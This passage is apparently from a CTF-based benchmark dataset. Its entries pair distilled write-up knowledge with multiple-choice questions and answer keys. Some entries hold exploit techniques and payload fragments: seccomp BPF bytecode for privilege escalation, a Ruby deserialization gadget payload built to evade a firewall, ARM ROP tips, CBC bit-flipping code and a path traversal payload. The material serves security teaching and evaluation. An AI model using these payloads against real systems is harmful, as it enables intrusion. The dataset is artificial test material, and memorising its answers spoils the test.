            "In a scenario where a CTF challenge presents a large block of text with numerous words starting with the same two letters and varying lengths, but includes a phrase that distinctly does not fit the pattern\u2014such as \"something hidden in the rules\"\u2014which of the following is the most appropriate next step?  - A. Ignore the out-of-pattern phrase as a distraction and focus on the words that fit the established pattern. - B. Directly search for the phrase in an internet search engine, assuming it's a common phrase used in puzzles. - C. Examine the rules or guidelines provided for the challenge more closely, looking for hidden messages or anomalies. - D. Try to find a cryptographic pattern in the text block that could be decrypted into a meaningful message. ",
            "When coming across a series of numbers in a CTF challenge that suggests hidden data but does not correspond to familiar formats like Unix timestamps, what approach is recommended for attempting to decode these numbers?  - A. Convert the numbers into ASCII characters directly, assuming each number represents a letter or symbol. - B. Use online tools or algorithms that specialize in decoding or uncovering hidden messages, such as trying the RSA Decimal algorithm on a dedicated decoding platform. - C. Treat the numbers as coordinates and plot them on a map to find a location-related hint. - D. Add or multiply the numbers in hopes of finding a pattern that could represent a word or phrase. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "insecure_seccomp",
        "write_up": "dataset/raw/insecure_seccomp.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 205,
        "max_score": 500,
        "difficulty": 0.41,
        "knowledge": [
            "When dealing with seccomp (Secure Computing Mode) in kernel challenges, modifying kernel behavior by commenting out specific checks or security features can significantly alter the interaction with syscall filters, especially if the challenge involves manipulating privilege levels or syscall responses. This approach hinges on understanding the kernel's default behavior and security mechanisms, particularly how they manage privileges and syscall filtering. If a challenge provides the means to modify kernel behavior or if the provided kernel is already modified, one should pay close attention to changes in security-related code, as they might hint at the intended exploitation path.",
            "To exploit BPF (Berkeley Packet Filter)-based syscall filtering mechanisms, especially in scenarios where seccomp applies filters to syscalls, creating a custom BPF filter that modifies syscall behavior (such as causing a syscall to fail or return a specific error) can be an effective strategy. This requires detailed knowledge of the BPF architecture, including the formats of `sock_filter` and `sock_fprog` structures. Tools like seccomp-tools can assist in generating BPF bytecode, which can be used to manipulate the program's execution flow, such as forcing a syscall to return an error, thereby enabling further exploitation paths, such as privilege escalation or bypassing security checks. This technique is highly useful in CTF challenges that involve interacting with or within a restricted or specially configured kernel environment.\n\nExample BPF bytecode to make `faccessat` syscall fail with error number 5:\n```\n5  \n0020 00 00 00000000  \n0015 00 01 0000010d  \n0006 00 00 00050005  \n0006 00 00 7fff0000  \n0006 00 00 00000000  \n```\nThis payload, when properly injected into a vulnerable or specially prepared application or environment, causes the `faccessat` syscall to always \"fail\" with an errno of 5, facilitating privilege escalation or other exploit vectors by subverting normal security checks."
        ],
        "question": [
            "In the context of customizing a Linux kernel for a CTF challenge, which of the following lines of code, if commented out in the `kernel/seccomp.c` file, would potentially allow unprivileged tasks to affect the behavior of privileged children by applying seccomp filters without the usual restrictions?  ``` -       if (!task_no_new_privs(current) && -                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN)) -               return ERR_PTR(-EACCES); ```  - A. Remove user permissions checks to enable root access capabilities. - B. Disable printing of kernel panic messages to aid in debugging. - C. Comment out security checks that prevent the application of seccomp filters based on privilege levels. - D. Adjust the system clock for process time accounting. ",
            "In creating a custom BPF filter to manipulate syscall responses for a CTF challenge, which of the following represents the emphasized goal of making the `faccessat` syscall always return an error, effectively simulating a failure condition?  ``` 5 0020 00 00 00000000 0015 00 01 0000010d 0006 00 00 00050005 0006 00 00 7fff0000 0006 00 00 00000000 ```  - A. The filter causes the `openat` syscall to return success unconditionally. - B. The filter ensures that any use of the `execve` syscall results in a permission denied error. - C. By adjusting the `jt` and `jf` fields, the filter modifies the behavior of the `getuid` syscall. - D. This BPF bytecode causes the `faccessat` syscall to always fail with an error number, simulating a failure. "
        ],
        "answer": [
            "C. Comment out security checks that prevent the application of seccomp filters based on privilege levels.",
            "D. This BPF bytecode causes the `faccessat` syscall to always fail with an error number, simulating a failure."
        ]
    },
    {
        "name": "Inspector Gadget",
        "write_up": "dataset/raw/Inspector Gadget.md",
        "type": "pwn",
        "competition": [
            "BSidesTLV/2021",
            "https://ctftime.org/event/1403/tasks/"
        ],
        "score": 450,
        "max_score": 500,
        "difficulty": 0.9,
        "knowledge": [
            "When facing deserialization vulnerabilities in Ruby applications, if direct exploitation paths are blocked or certain objects are filtered by a firewall, one can seek alternative gadget chains that bypass these restrictions. These alternative gadget chains may involve finding and using different Ruby classes that are not blocked and can trigger arbitrary code execution. For instance, if classes like `Gem::Requirement` or `Gem::DependencyList` are blocked, alternative objects with suitable methods (`marshal_load`, invoking `each` or similar iterable method on unmarshaled objects) should be considered. Classes such as `OpenStruct`, combined with manipulable objects like `CSV::Row`, can be utilized to craft payloads that circumvent the firewall and execute arbitrary code.",
            "In scenarios where an application firewall blocks certain suspicious strings or class names, manipulating the serialized object to include mandatory strings while avoiding the inclusion of blocked class names or strings is crucial. This can involve adding specific strings to the payload (e.g., 'DynamicLog@type@level@message') to meet firewall validation requirements without including directly filtered objects. This strategy is effective in bypassing firewalls designed to prevent deserialization attacks based on the presence or absence of certain strings or class names within the serialized data.\n\nExample payload crafting in Ruby deserialization scenarios (simplified version for illustrating the approach, may not directly apply):\n```ruby\nclass OpenStruct\n def marshal_dump\n    row = CSV::Row.new([\"A\"], [\"B\"])\n    row.instance_variable_set('@row', 'payload_trigger')\n    row\n end\nend\n\npayload = OpenStruct.new()\nserialized_payload = Base64.encode64(Marshal.dump(payload)).gsub(/\\n/,'')\nputs serialized_payload\n```\nThe 'payload_trigger' part should be replaced with the actual payload aiming to exploit the target system, crafted according to the application's context and the intended exploitation path."
        ],
        "question": [
            "In the context of bypassing Ruby deserialization vulnerabilities with alternative gadget chains, which of the following options correctly identifies a class that can be used to replace `Gem::Requirement` when it is blocked by an application firewall, considering that the goal is to trigger arbitrary code execution through deserialization?  - A. Use `Gem::DependencyList` with its `marshal_load` method to invoke arbitrary code execution, given its widespread support in Ruby applications. - B. Utilize `OpenStruct` in combination with `CSV::Row` to construct a payload that bypasses the firewall, leveraging `OpenStruct`'s ability to mimic `marshal_load` behavior. - C. Implement `Kernel` module directly to trigger execution of arbitrary code through deserialization, ensuring compatibility with most Ruby environments. - D. Resort to `JSON.parse` as a direct substitute for `Gem::Requirement` to evaluate arbitrary code snippets embedded within JSON payloads. ",
            "When designing a payload to bypass application firewalls in Ruby deserialization attacks, which strategy is essential for ensuring that the payload does not get blocked by the firewall?  - A. Including the complete class definitions for all Ruby core classes within the payload to ensure the firewall cannot filter based on missing class information. - B. Embedding `no-op` methods like `to_s` in every object within the payload to confuse firewall string matching algorithms. - C. Omitting any direct use of `eval` within the payload to avoid immediate detection by simple pattern matching techniques used by firewalls. - D. Adding specific strings (e.g., 'DynamicLog@type@level@message') to the payload that are required by the firewall for the payload to be considered valid, while avoiding blocked class names or strings. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Intergalactic Cinema",
        "write_up": "dataset/raw/Intergalactic Cinema.md",
        "type": "web",
        "competition": [
            "SpaceHeroes/2024",
            "https://ctftime.org/event/2254/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with ciphertext accompanied by a letter/number mapping, it is highly probable the encryption method used is a substitution cipher. One effective initial approach is to use an online solver to partially decrypt the text, which could lead to insights for further manual decryption effort.",
            "For manual decryption of a substitution cipher where the online solver fails to map some characters correctly, create a script that maps known letter or number translations. Incrementally update the mapping by examining the semi-deciphered output for recognizable patterns or missing letters in partially deciphered words, using these insights to refine the cipher mapping. A systematic approach involves:\n   - Maintaining a dictionary mapping of deciphered characters.\n   - Using a script to apply the mapping, taking care to preserve spaces and punctuation.\n   - Iteratively refining the mapping as more characters are correctly identified, often through context clues or by identifying patterns corresponding to common words or phrases.\n\nExample Payload:\n\n```py\nknown_chars = {  \n   'f': 't', \n   'r': 'h', \n   'q': 'e',  \n   ...  # continue mapping other characters as identified  \n}\n\nwith open('ct.txt', 'r') as file:  \n   for line in file:  \n       line_out = ''  \n       for char in line:  \n           if char in known_chars:  \n               line_out += known_chars[char]  \n           elif char in [' ', '!', ',', ':', '.', \"'\", '\"', '#', '?', '-', '_', '{', '}']:  \n               line_out += char  \n           elif char == '\\n':  \n               line_out += '\\n'  \n           else:  \n               line_out += '$'  \n       print(line_out)  \n```"
        ],
        "question": [
            "When encountering an encrypted script with an associated letter/number mapping on a website, which type of encryption is most likely being used, and what is the first step in attempting to decrypt it? - A. A transposition cipher, and the first step is to rearrange the ciphertext based on keyword length. - B. A Caesar cipher, and the first step is to shift the alphabet by a fixed number. - C. A substitution cipher, and the first step is to use an online solver to partially decrypt the text. - D. A Vigen\u00e8re cipher, and the first step is to guess the length of the keyword. ",
            "In manually decrypting a substitution cipher after an online solver has partially decrypted the text, what is a critical step to refining the cipher mapping to achieve complete decryption? - A. Randomly assign the remaining undeciphered characters to potential plaintext counterparts until the message makes sense. - B. Use a frequency analysis of the ciphertext to guess the remaining mappings based on the most common letters in the English language. - C. Go through the semi-deciphered output looking for recognizable patterns or missing letters in partially deciphered words, using these insights to refine the cipher mapping iteratively. - D. Translate the entire ciphertext into binary and look for patterns that could indicate the correct mapping of undeciphered characters. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Investigation Continues",
        "write_up": "dataset/raw/Investigation Continues.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 936,
        "max_score": 1000,
        "difficulty": 0.936,
        "knowledge": [
            "When investigating Windows systems for forensic analysis, especially to determine the timestamp of specific user activities, various plugins within the Volatility framework can be invaluable. If the regular plugin for reading event logs (`evtlogs`) fails, alternative data sources such as registry keys can be used. Specifically, the last failed login attempt timestamp can be extracted from bytes 40-47 of the `F` value in the user key under `SAM\\Domains\\Account\\Users\\[User ID]`. This timestamp follows the Windows FILETIME format, which counts the number of 100-nanosecond intervals since January 1, 1601 (UTC). To convert this to a human-readable format, the value needs to be converted from hexadecimal to seconds, and adjusted from the FILETIME epoch to the Unix epoch.\n\n```python\nimport time\ndef to_seconds(hex_str):\n   return float(int(hex_str, 16))/1e7 - 11644473600\n# Example usage for timestamp 'e8 0b 82 34 07 60 d6 01'\ntimestamp = \"01d6600734820be8\"\nprint(time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(to_seconds(timestamp))))\n```",
            "To identify when specific files were last accessed, such as a JPEG file, the `printkey` plugin of Volatility can be used to inspect the `RecentDocs` registry keys. These keys contain records of recently accessed documents, including file names and timestamps. This method can be particularly useful for determining when a user last opened a file, which could be critical in forensic investigations. The registry key of interest for JPEG files, for instance, is located at `Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.jpg` within the user's `NTUSER.DAT` file. To accurately interpret the binary data stored in these keys, forensic analysts need familiarity with the structure of Windows registry data and the specific registry key formats used to track recent documents.\n\n```bash\n# Using Volatility to read RecentDocs registry key for JPEG files\nvolatility -f memory_dump.img --profile=WinProfile printkey -K \"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.jpg\"\n```"
        ],
        "question": [
            "In forensic analysis of a Windows system using the Volatility framework, when the `evtlogs` plugin does not work for accessing event logs related to user login attempts, what alternative approach can be used to find the timestamp of the last failed login attempt?  - A. Use the `mftparser` plugin to parse the Master File Table for login attempt timestamps. - B. Extract the timestamp from bytes 40-47 of the `F` value in the user key under `SAM\\Domains\\Account\\Users\\[User ID]` using the `printkey` plugin. - C. Apply the `shellbags` plugin to access user-specific settings and timestamps related to login events. - D. Run the `netscan` plugin to scan for network connections at the time of the login attempt. ",
            "Which Volatility plugin can be utilized to determine when a specific JPEG file was last accessed by inspecting the `RecentDocs` registry keys in a Windows system forensic investigation?  - A. The `timeline` plugin to create a timeline of all file access events, including opening JPEG files. - B. The `filescan` plugin to scan for all instances of JPEG files accessed on the system. - C. The `printkey` plugin to inspect the `Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.jpg` registry key for access timestamps. - D. The `procdump` plugin to dump the process that last accessed the JPEG file, analyzing it for access timestamps. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Invisible Maze",
        "write_up": "dataset/raw/Invisible Maze.md",
        "type": "misc",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 956,
        "max_score": 1000,
        "difficulty": 0.956,
        "knowledge": [
            "When handling an encrypted string within a binary challenge, closely examine the binary for printable strings that reference key processes or outputs (like a congratulations message) that might clue you into the location of encryption or decryption routines within the program. This method can be particularly effective when static analysis tools like Ghidra are unable to automatically reference all parts of the binary.",
            "For binary challenges that involve custom encryption or encoding schemes, if the algorithm uses a small enough keyspace (e.g., two bytes), a brute-force approach can be viable. Crafting a Python script to iterate through possible key values and apply the suspected decryption formula can lead to the extraction of plaintext data, such as flags, if part of the flag format is known (e.g., 'inctf' in the flag).\n   \n   Example payload: \n   ```python\n   data = \"<encrypted_string>\".replace(\" \", \"\").decode(\"hex\")\n   for plus in range(256):\n       for x in range(256):\n           res = \"\".join([chr(((ord(c) + plus) ^ x) & 0xff) for c in data])\n           if '<known_flag_part>' in res:\n               print(plus, x, res)\n   ```"
        ],
        "question": [
            "In a binary reversing challenge, you suspect a particular string within the binary relates to the decryption of a flag. According to best practices, what should you do to potentially find the decryption routine or key in the absence of direct references found by tools like Ghidra? - A. Use a hex editor to manually search for the string and adjacent code - B. Disassemble the binary and look for the string in plaintext, assuming it's not encrypted - C. **Search for outputs related to key processes or success messages within the binary that could guide you to the relevant code sections** - D. Run the binary with various inputs to see if the output changes in a measurable way",
            "When dealing with a binary challenge that features a custom encryption mechanism with a small key space, which of the following approaches is considered effective for decrypting a known encrypted string if part of the flag format is known? - A. Decrypting the string using a predefined single key based on the encryption algorithm's characteristics - B. Writing an assembly program to reverse the encryption logic by patching the binary directly - C. **Creating a Python script to brute-force possible key combinations and apply the decryption formula** - D. Using a cryptographic analysis tool to automatically determine the encryption key without the need for brute-forcing"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "IoT Grill",
        "write_up": "dataset/raw/IoT Grill.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 497,
        "max_score": 497,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting stack-based buffer overflows in ARM firmware, it is useful to identify functions that manipulate user input without proper bounds checking. Specifically, if a function decodes base64 input into a fixed-size buffer without verifying that the decoded size will not exceed the buffer, it introduces a buffer overflow vulnerability. This can be exploited by crafting a payload that overwrites the return address on the stack to redirect execution flow.\n   \n   Example Payload (Base64-encoded): `B64:<base64_encoded_payload>`",
            "In ARM architecture, especially when dealing with THUMB mode, it's crucial to remember that the least significant bit (LSB) of the address to which control is transferred must be set. This indicates THUMB mode execution. When constructing a Return-Oriented Programming (ROP) chain on ARM, ensure to or (`|`) the addresses of the gadgets and functions with 1 to maintain correct execution mode.\n\n   Example ROP gadget usage: `const POPR0 = 0x00001458 | 1;`"
        ],
        "question": [
            "Given a scenario in an ARM firmware challenge where a function updates a device key by decoding base64 input directly into a statically allocated buffer, which of the following approaches introduces a stack-based buffer overflow vulnerability?  - A. Decoding base64 input directly into a dynamically allocated buffer based on the decoded size. - B. Decoding base64 input directly into a statically allocated buffer without checking the decoded size against the buffer's capacity. - C. Using strncpy to copy user input into a buffer, ensuring null-termination within the buffer's size. - D. Implementing input size verification before decoding the base64 input, rejecting any input that exceeds the buffer\u2019s size. ",
            "In the context of constructing a Return-Oriented Programming (ROP) chain for exploitation on ARM architecture, why is it necessary to modify the least significant bit (LSB) of gadget addresses?  - A. To align the stack pointer to a 16-byte boundary, ensuring efficient memory access. - B. To disable interrupts during the execution of the ROP chain, preventing any interruption of the exploit. - C. To indicate THUMB mode execution, which requires the LSB of the address to be set. - D. To enable ARM mode execution, ensuring compatibility with 32-bit instructions. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "IR",
        "write_up": "dataset/raw/IR.md",
        "type": "reverse",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with obfuscated or undocumented code, particularly in lesser-known languages or formats, it's often effective to manually reverse-engineer the code into a more familiar language or format for analysis. This approach was used with LLVM code, translating it into C++ to understand its operation. This involves understanding each instruction's function and effect on the data, then replicating those operations in the target language.\n\n   Example strategy:\n   - Identify unfamiliar code or data manipulation routines.\n   - Research each operation to understand its purpose and effect.\n   - Reimplement the routine in a well-understood language, keeping the logic intact.",
            "In a challenge involving encrypted or obscured strings where the manipulation process is known (in this case, a specific sequence of XOR and addition operations), you can reverse the process starting from the last known value (typically a null terminator for C strings) and work backward through the manipulation logic to retrieve the original string. This technique is effective when you have the final output and know the operations applied to each character or byte.\n\n   Sample Python reverse logic:\n   ```python\n   def reverse_logic(encoded_string):\n       output = \"\"\n       last = 0  # Assuming the last byte is known and is 0 (null terminator)\n       for character in reversed(encoded_string):\n           for i in range(32, 127):  # Printable ASCII range\n               if ((i + 5) ^ (last + 5)) == ord(character):\n                   output += chr(i)\n                   last = i\n                   break\n       return output[::-1]  # Reverse the string to get the original order\n   ```"
        ],
        "question": [
            "When translating complex or obfuscated code from a less widely-known format to a more familiar programming language, which of the following steps is crucial to ensure an accurate translation?  - A. Rewrite the logic in a high-level pseudocode before implementing it in the target language. - B. Directly translate each instruction without understanding its specific function or impact. - C. Focus solely on the data structures involved, ignoring the operational logic. - D. Research and understand each operation\u2019s function and effect before replicating them in the target language. ",
            "In the context of reversing a sequence of XOR and addition operations applied to an obscured string to retrieve the original string, which method is effective when the final output and the manipulation processes are known?  - A. Starting from the first character and applying the inverse operations in forward order. - B. Starting from the last known value (e.g., a null terminator in C strings) and working backward through the manipulation logic. - C. Randomly selecting characters to decipher using brute-force methods without considering the manipulation logic. - D. Decrypting the entire string as a single operation by applying a universal inverse function. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "IS_THIS_LCG_",
        "write_up": "dataset/raw/IS_THIS_LCG_.md",
        "type": "crypto",
        "competition": [
            "RCTF/2022",
            "https://ctftime.org/event/1806/tasks/"
        ],
        "score": -1.0,
        "max_score": 769,
        "difficulty": -1,
        "knowledge": [
            "To recover truncated LCG's internal state in cryptographic challenges where the LCG parameters and part of outputs are known, Closest Vector Problem (CVP) techniques can be effectively applied. The approach involves using an algorithm or mathematical technique designed to find vectors that are close to a given target vector within a lattice, where the lattice is constructed based on the known outputs and properties of the LCG. This method is applicable in scenarios where enough LCG output is partially revealed and can be employed to predict future outputs or revert the LCG to its initial state. \n    - Example of theoretical approach: Use of inequalities and modular constraints derived from LCG parameters and outputs to construct a lattice. Then, apply a CVP solver to find the closest vector to a target vector derived from partially known outputs.",
            "For challenges involving elliptic curve linear congruential generators (EC-LCG) where several x-coordinates of elliptic curve points are divulged, it's possible to compute the curve and subsequently solve for primes used in the encryption scheme. If at least seven initial values (x-coordinates) are known, the curve and its parameters can be computed. This technique involves constructing a matrix from the known x-coordinates, and then using the determinant of this matrix as it is a multiple of the prime of interest. This knowledge is principally used to break encryption schemes where EC-LCG is utilized to generate cryptographic primes.\n    - Example of application: Use of a matrix whose elements are functions of the known x-coordinates to compute the determinant. This determinant, in conjunction with the encryption scheme's modulus, can be used to recover the prime by calculating the Greatest Common Divisor (GCD) of the modulus and the determinant."
        ],
        "question": [
            "In a cryptographic challenge, assuming an LCG's output is partially revealed through a process where a 1024-bit mask `m` is used (`2 ** 1024`), and subsequent outputs are generated by iteratively applying a linear transformation and printing the top 174 bits (`x >> 850`). Given this scenario and aiming to recover the truncated LCG's internal state, which technique is most suitable? - A. Utilizing brute-force to generate possible states and match the known outputs. - B. Employing a differential cryptanalysis approach to exploit linear approximations. - C. Applying Closest Vector Problem (CVP) techniques leveraging inequalities and modular constraints derived from the known parts of the LCG outputs. - D. Using frequency analysis on the known output bits to infer possible states.",
            "In a challenge involving the decryption of a message encrypted with an elliptic curve-based scheme, the first step requires solving for a prime used in the scheme. Given that seven initial x-coordinates (x0 to x6) of points on an elliptic curve are revealed (generated through an EC-LCG) and the encryption modulus N is known, which method is appropriate to compute the curve and find the prime? - A. Calculating the Fast Fourier Transform (FFT) of the x-coordinates to find a pattern. - B. Constructing a matrix using the given x-coordinates, calculating its determinant, and then finding the Greatest Common Divisor (GCD) of the determinant and N to recover the prime. - C. Utilizing a simple enumeration over possible primes and testing each against the known x-coordinates. - D. Applying the Chinese Remainder Theorem (CRT) with the x-coordinates to solve for the prime."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "It's as easy as access=0000",
        "write_up": "dataset/raw/It's as easy as access=0000.md",
        "type": "crypto",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 300,
        "max_score": 700,
        "difficulty": 0.42857142857142855,
        "knowledge": [
            "In a challenge involving AES-CBC encrypted data, if the goal is to manipulate the plaintext without knowing the key, XOR operations can be performed on the Initialization Vector (IV) to flip specific bits in the first block of plaintext. This approach exploits the malleability of AES-CBC to alter the outcome of the decryption process to fulfill certain conditions. For instance, to change a portion of the decrypted plaintext from \"9999\" to \"0000\", one can XOR the bytes in the IV corresponding to the \"9999\" part in the plaintext with the XOR result of '9' and '0' (since X XOR X = 0 and 0 XOR Y = Y, flipping '9' to '0').\n\n    Example payload modification technique:\n\n    ```python\n    original_iv = iv[:position] + bytes([(iv[position] ^ ord('9') ^ ord('0'))]) + iv[position+1:]\n    ```",
            "The structural integrity of AES-CBC encrypted messages allows for message manipulation techniques such as bit flipping attack, which can be particularly useful in scenarios where the manipulation of access control tokens or other sensitive data fields is required to gain elevated privileges or access unauthorized information, as demonstrated in this CTF challenge. This technique requires no knowledge of the encryption key but a deep understanding of how CBC mode operates and the ability to manipulate the IV or ciphertext directly. This knowledge underpins a critical vulnerability in improperly implemented encryption schemes, emphasizing the need for secure IV handling and the validation of encrypted data before processing.\n\n    **No example payload is given for this point, as it primarily focuses on the theoretical understanding and application of the mentioned technique.**"
        ],
        "question": [
            "In a given scenario where we need to exploit the malleability of AES-CBC to change a portion of an encrypted message from \"9999\" to \"0000\" without having the encryption key, which operation should be applied to the Initialization Vector (IV) at the positions corresponding to \"9999\"?  - A. XOR the IV's bytes with the sum of '9' and '0' - B. Add the binary values of '9' and '0' to the IV's bytes - C. XOR the IV's bytes corresponding to \"9999\" with the XOR result of '9' and '0' - D. Replace the IV's bytes with the decimal difference between '9' and '0' ",
            "In the context of exploiting AES-CBC encryption vulnerabilities for accessing unauthorized data, what is one critical aspect that should be understood and can be manipulated without the need for the encryption key?  - A. The randomness of the get_random_bytes function - B. The necessity for padding encrypted messages - C. The direct manipulation of ciphertext to influence plaintext - D. The manipulation of the Initialization Vector (IV) or ciphertext directly to alter decrypted message contents "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Ive got the same combination on my luggage",
        "write_up": "dataset/raw/Ive got the same combination on my luggage.md",
        "type": "pwn",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 205,
        "max_score": 1000,
        "difficulty": 0.205,
        "knowledge": [
            "When solving CTF challenges involving XOR encryption, it's crucial to understand the basic properties of XOR: Commutative (A \u2295 B = B \u2295 A), Associative (A \u2295 (B \u2295 C) = (A \u2295 B) \u2295 C), Identity (A \u2295 0 = A), and Self-Inverse (A \u2295 A = 0). This knowledge is instrumental in devising strategies to decrypt messages or reverse engineer encryption mechanisms by experimenting with known values and operations to isolate unknowns.",
            "For challenges where the encryption involves multiple XOR operations with different keys and the output is a concatenation of results, one can reverse the encryption by strategically applying XOR properties. Given hashes A, B, and C where A = plaintext \u2295 key1 \u2295 key2, B = plaintext \u2295 key1, and C = plaintext \u2295 key2, you can recover the plaintext by calculating B \u2295 C to get key1 \u2295 key2, then XOR this result with A. Applying this method allows for the decryption of the plaintext without directly needing to know the keys.\n   - Python sample to apply this method: \n     ```python\n     from pwn import xor\n     \n     with open(\"hash.txt\", \"r\") as file:  \n        hash = bytes.fromhex(file.read().strip())  \n        A, B, C = hash[:40], hash[40:80], hash[80:]\n        BC = xor(B, C)  \n        plaintext = xor(BC, A)  \n        print(plaintext.decode())\n     ```"
        ],
        "question": [
            "In the context of solving CTF challenges that involve XOR encryption, which property of XOR is crucial for reversing or decrypting messages when you have an equation where two keys are XORed with a plaintext, but you only have the resulting hash values?  - A.Commutative: A \u2295 B = B \u2295 A - B.Associative: A \u2295 (B \u2295 C) = (A \u2295 B) \u2295 C - C.Identity: A \u2295 0 = A - D.Self-Inverse: A \u2295 A = 0 ",
            "When attempting to decrypt a message that was encrypted by XORing it with two different keys and you have three hash outputs (A = plaintext \u2295 key1 \u2295 key2, B = plaintext \u2295 key1, and C = plaintext \u2295 key2), what step is essential for recovering the plaintext without directly knowing the keys?  - A.Calculating A \u2295 B to get key2 - B.Calculating A \u2295 C to get key1 - C.XORing A with both B and C separately, then XORing the results - D.Calculating B \u2295 C to get key1 \u2295 key2, then XOR this result with A "
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "Izzy",
        "write_up": "dataset/raw/Izzy.md",
        "type": "reverse",
        "competition": [
            "ASIS/2020/Finals",
            "https://ctftime.org/event/1111/tasks/"
        ],
        "score": 68,
        "max_score": 500,
        "difficulty": 0.136,
        "knowledge": [
            "In reverse engineering challenges where encrypted data involves XOR operations with dynamically generated keys based on environmental variables or time, the decryption approach includes replicating the key generation logic. The decryption script should accurately regenerate keys by mimicking the original environment or conditions as closely as possible. In this scenario, the key was generated based on the current month and a predefined formula. The decryption script then XORs the generated keys with the hexadecimal encrypted data to produce the plaintext. This approach highlights the importance of understanding how encryption keys are derived to devise an effective decryption strategy.",
            "When dealing with reverse engineering tasks that output hexadecimal-encrypted files, converting hex to bytes before processing aids in the decryption process. This conversion allows for direct operations to be performed on the binary data, which can then be XORed with the generated keys to reveal the plaintext. The accurate conversion and handling of data types are critical for successful decryption in challenges where data manipulation is key. Example conversion in Python: `content = bytes.fromhex(content)`."
        ],
        "question": [
            "In the context of a reverse engineering challenge featuring an encryption mechanism that uses XOR operations with dynamic keys derived from environmental variables such as the current month, which approach is critical for successfully reversing the encryption?  - A. Generating keys by replicating the condition-dependent logic used in the original encryption script, then XORing these keys with the encrypted data. - B. Extracting the encryption logic directly from executable memory at runtime. - C. Decompiling the entire application to analyze the encryption function in isolation. - D. Applying brute force to guess the key values without understanding the logic behind key generation. ",
            "During the decryption process of hexadecimal-encrypted files in a reverse engineering challenge, why is converting hex data to bytes before further processing considered a crucial step?  - A. It facilitates easier manipulation and analysis of binary data by applying operations like XOR directly on the binary form of the encrypted content. - B. Hexadecimal data cannot be directly read by decryption tools without conversion. - C. Conversion to bytes automatically decrypts minor encryption schemes due to built-in Python libraries. - D. It significantly reduces the file size, making decryption computationally less intensive. "
        ],
        "answer": [
            "A.",
            "A."
        ]
    },
    {
        "name": "j0hnny_5",
        "write_up": "dataset/raw/j0hnny_5.md",
        "type": "This CTF challenge falls under the category of `forensics`.",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 999,
        "max_score": 1000,
        "difficulty": 0.999,
        "knowledge": [
            "When dealing with abstract UNIX domain sockets not bound to the filesystem, connecting can be done using scripting languages like Python. If the socket address is provided as a hexadecimal escape sequence (e.g., `\\x00?`), one must format the connection string correctly within the script to successfully establish a connection.  \n   Example snippet for Python:  \n   ```python\n   import socket\n   s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n   s.connect(\"\\x00?\")\n   ```",
            "Path traversal vulnerabilities can be exploited by manipulating input to access or interact with files outside the intended directory. When commands such as `show` or `upload` do not properly sanitize user input, it's possible to access directories or files outside of restricted paths using sequences like `../../`. This method can be used to reveal sensitive information or interact with unintended files.  \n   Example payload for exploiting path traversal to list the contents of the root directory:  \n   ```\n   > show ../../\n   ```"
        ],
        "question": [
            "When connecting to an abstract UNIX domain socket using Python, which of the following is the correct way to format the address if it is given in a non-standard format such as `\\x00?`? - A. `s.connect(\"0x00?\")` - B. `s.connect(\"\\x00?\")` - C. `s.connect(\"/x00?\")` - D. `s.connect(\"x00?\")`",
            "Which of the following payloads correctly exploits a path traversal vulnerability to list the contents of the root directory in a system where the `show` command does not properly sanitize user input? - A. `> show /../../` - B. `> show ./.` - C. `> show ../../` - D. `> show /.../.../`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "JigBoy",
        "write_up": "dataset/raw/JigBoy.md",
        "type": "forensics",
        "competition": [
            "Mapna/2024",
            "https://ctftime.org/event/2205/tasks/"
        ],
        "score": 375,
        "max_score": 375,
        "difficulty": 1.0,
        "knowledge": [
            "When confronted with a forensics challenge involving a file with an unknown or `.damaged` extension, one initial step is to use a hex editor to examine the file's header bytes. Identifying the magic numbers (unique sequences that identify file formats) through this approach can lead to the determination of the file's actual type. If the magic number is unfamiliar, searching the bytes on the internet can provide insights into the correct file format, which is crucial for further analysis and repair. Example header for a `.jbg2` file: `97 4A 42 32 0D 0A 1A 0A`.",
            "After identifying and correcting the file header based on the file type specification, if the file still cannot be properly viewed or seems corrupted, further investigation into the file structure and comparison with a known good sample of the same file type might be necessary. This could involve analyzing and possibly correcting metadata such as the file size or specific format-related bytes. Copying specific file structure elements from a valid sample (such as size bytes or ending data markers) to replace potentially corrupted parts in the original file can resolve issues preventing the file from being opened or displayed correctly."
        ],
        "question": [
